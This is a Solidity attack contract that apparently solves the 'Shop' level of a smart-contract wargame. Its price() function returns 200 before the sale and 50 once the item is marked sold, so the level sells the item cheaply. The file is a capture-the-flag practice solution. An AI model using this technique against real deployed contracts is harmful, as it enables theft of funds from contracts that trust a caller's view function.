// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Levels/Shop.sol";

contract ShopAttack {

  Shop shop;

  constructor(address _shop) {
    shop = Shop(_shop);
  }

  function attack() public {
    shop.buy();
  }

  function price() external view returns (uint) {
    if (shop.isSold()) {
      return 50;
    } else return 200;
  }
}
